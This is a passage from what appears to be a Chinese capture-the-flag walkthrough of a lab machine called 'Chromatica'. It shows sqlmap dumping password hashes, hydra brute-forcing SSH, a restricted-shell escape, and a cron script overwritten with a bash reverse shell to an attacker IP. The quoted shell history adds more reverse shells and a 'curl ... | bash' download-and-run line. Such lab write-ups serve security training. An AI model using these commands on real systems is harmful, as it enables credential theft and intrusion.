1  | New York City | 8336817    | 10001       |<br>| 2  | Los Angeles   | 3979576    | 90001       |<br>| 3  | Chicago       | 2693976    | 60601       |<br>| 4  | Houston       | 2320268    | 77001       |<br>| 5  | Phoenix       | 1680992    | 85001       |<br>| 6  | Philadelphia  | 1584064    | 19101       |<br>| 7  | San Antonio   | 1547253    | 78201       |<br>| 8  | San Diego     | 1425976    | 92101       |<br>| 9  | Dallas        | 1317929    | 75201       |<br>| 10 | San Jose      | 1030119    | 95101       |<br>| 11 | Paris         | 2140526    | 75001       |<br>+----+---------------+------------+-------------+<br><br>[22:06:23] [INFO] table &#x27;Chromatica.cities&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.56.15/dump/Chromatica/cities.csv&#x27;<br>[22:06:23] [INFO] fetching columns for table &#x27;users&#x27; in database &#x27;Chromatica&#x27;<br>[22:06:23] [INFO] resumed: 4<br>[22:06:23] [INFO] resumed: id<br>[22:06:23] [INFO] resumed: username<br>[22:06:23] [INFO] resumed: password<br>[22:06:23] [INFO] resumed: description<br>[22:06:23] [INFO] fetching entries for table &#x27;users&#x27; in database &#x27;Chromatica&#x27;<br>[22:06:23] [INFO] fetching number of entries for table &#x27;users&#x27; in database &#x27;Chromatica&#x27;<br>[22:06:23] [INFO] resumed: 5<br>[22:06:23] [INFO] resumed: admin<br>[22:06:23] [INFO] resumed: 1<br>[22:06:23] [INFO] resumed: 8d06f5ae0a469178b28bbd34d1da6ef3<br>[22:06:23] [INFO] resumed: admin<br>[22:06:23] [INFO] resumed: developer account for taz<br>[22:06:23] [INFO] resumed: 2<br>[22:06:23] [INFO] resumed: 1ea6762d9b86b5676052d1ebd5f649d7<br>[22:06:23] [INFO] resumed: dev<br>[22:06:23] [INFO] resumed: user account for testing<br>[22:06:23] [INFO] resumed: 3<br>[22:06:23] [INFO] resumed: 3dd0f70a06e2900693fc4b684484ac85<br>[22:06:23] [INFO] resumed: user<br>[22:06:23] [INFO] resumed: developer account for selim<br>[22:06:23] [INFO] resumed: 4<br>[22:06:23] [INFO] resumed: f220c85e3ff19d043def2578888fb4e5<br>[22:06:23] [INFO] resumed: dev-selim<br>[22:06:23] [INFO] resumed: intern<br>[22:06:23] [INFO] resumed: 5<br>[22:06:23] [INFO] resumed: aaf7fb4d4bffb8c8002978a9c9c6ddc9<br>[22:06:23] [INFO] resumed: intern<br>[22:06:23] [INFO] recognized possible password hashes in column &#x27;password&#x27;<br>do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N<br>do you want to crack them via a dictionary-based attack? [Y/n/q] Y<br>[22:06:23] [INFO] using hash method &#x27;md5_generic_passwd&#x27;<br>[22:06:23] [INFO] resuming password &#x27;keeptrying&#x27; for hash &#x27;3dd0f70a06e2900693fc4b684484ac85&#x27; for user &#x27;user&#x27;<br>what dictionary do you want to use?<br>[1] default dictionary file &#x27;/usr/share/sqlmap/data/txt/wordlist.tx_&#x27; (press Enter)<br>[2] custom dictionary file<br>[3] file with list of dictionary files<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">1</span><br>[22:06:23] [INFO] using default dictionary<br>do you want to use common password suffixes? (slow!) [y/N] N<br>[22:06:23] [INFO] starting dictionary-based cracking (md5_generic_passwd)<br>[22:06:23] [INFO] starting 2 processes <br>Database: Chromatica                                                                             <br>Table: users<br>[5 entries]<br>+----+-----------------------------------------------+-----------+-----------------------------+<br>| id | password                                      | username  | description                 |<br>+----+-----------------------------------------------+-----------+-----------------------------+<br>| 1  | 8d06f5ae0a469178b28bbd34d1da6ef3              | admin     | admin                       |<br>| 2  | 1ea6762d9b86b5676052d1ebd5f649d7              | dev       | developer account for taz   |<br>| 3  | 3dd0f70a06e2900693fc4b684484ac85 (keeptrying) | user      | user account for testing    |<br>| 4  | f220c85e3ff19d043def2578888fb4e5              | dev-selim | developer account for selim |<br>| 5  | aaf7fb4d4bffb8c8002978a9c9c6ddc9              | intern    | intern                      |<br>+----+-----------------------------------------------+-----------+-----------------------------+<br><br>[22:06:45] [INFO] table &#x27;Chromatica.users&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.56.15/dump/Chromatica/users.csv&#x27;<br>[22:06:45] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.56.15&#x27;<br><br>[*] ending @ 22:06:45 /2024-11-09/<br></code></pre></td></tr></table></figure><p>获取到用户密码的hash值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# cat /root/.local/share/sqlmap/output/192.168.56.15/dump/Chromatica/users.csv <br>id,password,username,description<br>1,8d06f5ae0a469178b28bbd34d1da6ef3,admin,admin<br>2,1ea6762d9b86b5676052d1ebd5f649d7,dev,developer account for taz<br>3,3dd0f70a06e2900693fc4b684484ac85 (keeptrying),user,user account for testing<br>4,f220c85e3ff19d043def2578888fb4e5,dev-selim,developer account for selim<br>5,aaf7fb4d4bffb8c8002978a9c9c6ddc9,intern,intern<br><br><br><br><br>┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# cat /root/.local/share/sqlmap/output/192.168.56.15/dump/Chromatica/users.csv | awk -F, &#x27;&#123;print $2&#125;&#x27; &gt; pass.txt <br>                                                                                                  <br>┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# cat pass.txt<br>password<br>8d06f5ae0a469178b28bbd34d1da6ef3<br>1ea6762d9b86b5676052d1ebd5f649d7<br>3dd0f70a06e2900693fc4b684484ac85 (keeptrying)<br>f220c85e3ff19d043def2578888fb4e5<br>aaf7fb4d4bffb8c8002978a9c9c6ddc9<br><br></code></pre></td></tr></table></figure><p><a href="https://crackstation.net/">https://crackstation.net/</a></p><p>解码</p><p><img src="/2024/11/06/TestWP/M-1/5.png"></p><p>添加到密码中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─#  echo &quot;adm\!n\nflaghere\nkeeptring\nintern00\n&quot; &gt;&gt; pass.txt <br>                                                                                                  <br>┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# cat pass.txt<br>password<br>8d06f5ae0a469178b28bbd34d1da6ef3<br>1ea6762d9b86b5676052d1ebd5f649d7<br>3dd0f70a06e2900693fc4b684484ac85 (keeptrying)<br>f220c85e3ff19d043def2578888fb4e5<br>aaf7fb4d4bffb8c8002978a9c9c6ddc9<br><br>adm!n<br>flaghere<br>keeptring<br>intern00<br><br></code></pre></td></tr></table></figure><p>使用hydra爆破</p><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# hydra -L user.txt -P pass.txt 192.168.56.15 ssh<br>Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-09 22:13:51<br>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries (l:6/p:11), ~5 tries per task<br>[DATA] attacking ssh://192.168.56.15:22/<br>[22][ssh] host: 192.168.56.15   login: dev   password: flaghere<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-09 22:14:03<br></code></pre></td></tr></table></figure><p>获取dev：：flaghere</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# ssh dev@192.168.56.15<br>dev@192.168.56.15&#x27;s password: <br>GREETINGS,<br>THIS ACCOUNT IS NOT A LOGIN ACCOUNT<br>IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO<br>EITHER CONTACT YOUR ADMIN<br>OR THINK OUTSIDE THE BOX<br>BE LAZY AND CONTACT YOUR ADMIN<br>OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,<br>REGARDS<br><br>brightctf&#123;ALM0ST_TH3R3_34897ffdf69&#125;<br>Connection to 192.168.56.15 closed.<br></code></pre></td></tr></table></figure><p>flag是假的，并且好像被关闭了ssh链接。</p><p>这里可以把终端框缩小。让上面的文字不能够完整显式，这时我们就可以!&#x2F;bash拿到一个bash的用户</p><p><img src="/2024/11/06/TestWP/M-1/6.png"></p><p><img src="/2024/11/06/TestWP/M-1/7.png"></p><p>成功</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><img src="/2024/11/06/TestWP/M-1/8.png"></p><p>获取到userflag。</p><p>在目录中还有一个bye.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">dev@Chromatica:~$ cat bye.sh <br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span>                                                                                                                                                                                                                                 <br>                                                                                                                                                                                                                                            <br>/usr/bin/more /home/dev/hello.txt                                                                                                                                                                                                           <br>exit 0    <br></code></pre></td></tr></table></figure><p>看起来是这里的问题。查询哪里调用了它</p><p>看下该用户的执行记录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br></pre></td><td class="code"><pre><code class="hljs shell">dev@Chromatica:~$ cat .bash_history <br>cd                                                                                                                                                                                                                                          <br>neofetch                                                                                                                                                                                                                                    <br>TF=$(mktemp)                                                                                                                                                                                                                                <br>echo &#x27;exec /bin/sh&#x27; &gt; $TF                                                                                                                                                                                                                   <br>sudo -l                                                                                                                                                                                                                                     <br>clear                                                                                                                                                                                                                                       <br>ll                                                                                                                                                                                                                                          <br>clear                                                                                                                                                                                                                                       <br>sudo neofetch --config $T                                                                                                                                                                                                                   <br>sudo neofetch --config $TF                                                                                                                                                                                                                  <br>exi                                                                                                                                                                                                                                         <br>exit                                                                                                                                                                                                                                        <br>cd                                                                                                                                                                                                                                          <br>sudo -l                                                                                                                                                                                                                                     <br>sudo -u zenitsu neofetch --config $TF                                                                                                                                                                                                       <br>echo $TF$                                                                                                                                                                                                                                   <br>clear                                                                                                                                                                                                                                       <br>ll                                                                                                                                                                                                                                          <br>clear                                                                                                                                                                                                                                       <br>TF=$(mktemp)                                                                                                                                                                                                                                <br>echo &#x27;exec /bin/sh&#x27; &gt; $TF                                                                                                                                                                                                                   <br>sudo -u zenitsu neofetch --config $TF<br>clear <br>systemctl ssh<br>systemctl status ssh<br>clear<br>ll<br>clear<br>exit<br>clear<br>ls<br>pwd<br>vim hello.txt<br>clear<br>ll<br>more hello.txt <br>vim hello.txt<br>clear<br>more hello.txt <br>exit<br>cd<br>ll<br>vim .bashrc<br>exit<br>./linpeas.sh &gt; security_checks/dev.log<br>./linpeas.sh &gt; security_checks&gt;dev.log<br>./linpeas.sh &gt; security_checks/dev.log<br>ll<br>cd security_checks/<br>ll<br>vim dev.log <br>more dev.log <br>su analyst<br>vim .bashrc<br>cd<br>vim .bashrc <br>ll<br>cd ..<br>ll<br>cd taz/<br>ll<br>clear<br>cd<br>ll<br>ls<br>ls<br>ls -la<br>clear<br>l<br>clear<br>ls .ssh<br>ll<br>ls<br>ls -lah<br>mv .bashrc.bak .bashrc<br>source .bashrc <br>ll<br>cd<br>ll<br>cd<br>vim bye.sh<br>clear<br>ll<br>more .bashrc <br>clear<br>ll<br>vim /etc/ssh/ssh_config<br>ll<br>chmod +x bye.sh <br>clear<br>ll<br>clear<br>ll<br>clear<br>exit<br>clear<br>ll<br>clear<br>ll<br>exit<br>id<br>cat /etc/passwd<br>sudo -l <br>find --help<br>clear<br>find --help<br>man find <br>find / -perm -4000 -type f -ls 2&gt;/dev/null<br>clear<br>ll<br>claer<br>clear<br>cat /etc/crontab<br>clear<br>cat /etc/crontab<br>ll /opt/scripts/end_of_day.sh <br>vim /opt/scripts/end_of_day.sh <br>clear<br>cat /etc/crontab <br>cat /opt/scripts/end_of_day.sh<br>exit<br>su analyst<br>shutdown now<br>clear<br>iptables -L<br>exit<br>clear<br>ls<br>cat hello.txt <br>vim bye.sh <br>ll<br>quit<br>exit<br>clear<br>ls<br>ls /var/www/html/<br>ls<br>ll<br>cd /var/www/<br>ls<br>ll<br>cd html/<br>ms<br>ll<br>cd dev-portal/<br>ls<br>cd assets/<br>ls<br>cd ..<br>ls<br>cd css/<br>ls<br>vim style.css <br>sudo -l<br>clear<br>su -<br>clear<br>ll<br>clear<br>cat /etc/passwd<br>clear<br>sudo -l <br>cler<br>clear<br>su analyst<br>clear<br>ll<br>cat /etc/crontab <br>vim /opt/scripts/end_of_day.sh <br>ls<br>ll<br>sudo su<br>su<br>clear<br>exit<br>ll<br>cat hello.txt <br>ls<br>cat /etc/passwd<br>cat /etc/cronta<br>cat /etc/crontab<br>ll /opt/scripts/end_of_day.sh <br>vim  /opt/scripts/end_of_day.sh <br>cat /opt/scripts/end_of_day.sh <br>cler<br>clear<br>vim /etc/dnsmasq.cinf<br>vim /etc/dnsmasq.conf<br>cat /etc/hosts<br>clear<br>exit<br>clear<br>su - root<br>exit<br>clear<br>ll<br>clear<br>ll<br>clear<br>clear<br>ls<br>cat hello.txt <br>clear<br>ll<br>clear<br>ls<br>ll<br>/bin/bash<br>clear<br>ll<br>clearr<br>clear<br>ls<br>clear<br>ll<br>cat /etc/crontab<br>vim /opt/scripts/end_of_day.sh <br>clear<br>vim /opt/scripts/end_of_day.sh <br>vim /opt/scripts/<br>clear<br>cat /etc/crontab<br>timedatectl<br>clear<br>ls<br>l<br>ll<br>exit<br>clear<br>cat /etc/passwd <br>clear<br>sudo -l <br>clear<br>cat /etc/crontab<br>ll /opt/scripts/end_of_day.sh <br>vim /opt/scripts/end_of_day.sh<br>cat /etc/dnsmasq.conf<br>cat /etc/hosts<br>id<br>hostname<br>curl 192.168.56.1/linpeas.sh|bash<br>/opt/DVWA/vulnerabilities/csrf/test_credentials.php<br>ls -lah<br>cat dev.txt <br>mv dev.txt user.txt<br>cat user.txt <br>cat hello.txt <br>cls<br>ls<br>cat bye.sh <br>cd /opts<br>cd /opt<br>clear<br>ls<br>ls -R<br>clear<br>ls -lahR<br>ls<br>clear<br>ls<br>rm linpeas.sh <br>ls -lh<br>cd scripts/<br>ls<br>cat end_of_day.sh <br>cd ..<br>cd security_checks/<br>ls<br>cat *<br>cls<br>clear<br>ls<br>cat analyst.log <br>cls<br>clearar<br>clear<br>cd ..<br>cd scripts/<br>ls<br>ls -lah<br>cat end_of_day.sh <br>echo &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/6666 0&gt;&amp;1&quot;&#x27; &gt;&gt; end_of_day.sh <br>cat end_of_day.sh <br>vi end_of_day.sh <br>clear<br>upgrade<br>exit<br>is<br>id<br>/bin/bash<br>passwd<br>cd /root<br>ls<br>ls -lah<br>cd .ssh<br>ls<br>cat id_ecdsa<br>cat authorized_keys <br>cat id_ecdsa.pub &gt; authorized_keys <br>id<br>bash -p<br>ls<br>exit<br>exit<br>ls /bin/bash<br>ls -lah /bin/bash<br>cd /opt/<br>ls<br>cd scripts/<br>ls<br>cat end_of_day.sh <br>echo &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.1/6666 0&gt;&amp;1&#x27; &gt;&gt; end_of_day.sh<br>cat end_of_day.sh <br>cls<br>ls<br>clear<br>ls<br>cat end_of_day.sh <br>echo &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.1/6666 0&gt;&amp;1&#x27; &gt;&gt; end_of_day.sh<br>cat end_of_day.sh <br>cls<br>clear<br>cat end_of_day.sh <br>echo &quot;#this is my end of day script&quot; &gt; end_of_day.sh <br>cat end_of_day.sh <br>bash -p<br>ls<br>cat hello.txt<br>cat user.txt<br>sudo -l<br>find / -perm -u=s -type f 2&gt;/dev/null<br>ls<br>ls -al<br>cat bye.sh <br>cat .bash_history <br>cat /opt/scripts/end_of_day.sh <br>cat /etc/cron*<br>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.4/1234 0&gt;&amp;1&quot; &gt; /opt/scripts/end_of_day.sh <br>ls<br><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/M-1/9.png"><br><img src="/2024/11/06/TestWP/M-1/10.png"><br><img src="/2024/11/06/TestWP/M-1/11.png"></p><p>看起来这个sh文件是在ssh配置中的，当我们ssh登录时就会强制执行此文件让我们的ssh连接退出</p><p>且还发现了在&#x2F;opt&#x2F;scripts&#x2F;end_of_day.sh 的可执行文件可能为定时任务。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">dev@Chromatica:~$ cat /etc/crontab <br><span class="hljs-meta prompt_"># </span><span class="language-bash">/etc/crontab: system-wide crontab</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Unlike any other crontab you don<span class="hljs-string">&#x27;t have to run the `crontab&#x27;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">command</span> to install the new version when you edit this file</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">and files <span class="hljs-keyword">in</span> /etc/cron.d. These files also have username fields,</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">that none of the other crontabs <span class="hljs-keyword">do</span>.</span><br><br>SHELL=/bin/sh<br><span class="hljs-meta prompt_"># </span><span class="language-bash">You can also override PATH, but by default, newer versions inherit it from the environment</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Example of job definition:</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">.---------------- minute (0 - 59)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">|  .------------- hour (0 - 23)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">|  |  .---------- day of month (1 - 31)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">|  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">|  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">|  |  |  |  |</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">*  *  *  *  * user-name <span class="hljs-built_in">command</span> to be executed</span><br>17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br>* *     * * *   analyst /bin/bash /opt/scripts/end_of_day.sh<br><br></code></pre></td></tr></table></figure><p>确实是定时任务，进行反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">dev@Chromatica:~$ cat /opt/scripts/end_of_day.sh <br><span class="hljs-meta prompt_">#</span><span class="language-bash">this is my end of day script</span><br>dev@Chromatica:~$ echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.4/1234 0&gt;&amp;1&quot; &gt; /opt/scripts/end_of_day.sh <br>dev@Chromatica:~$ cat /opt/scripts/end_of_day.sh <br>bash -i &gt;&amp; /dev/tcp/192.168.56.4/1234 0&gt;&amp;1<br><br></code></pre></td></tr></table></figure><p>等待</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 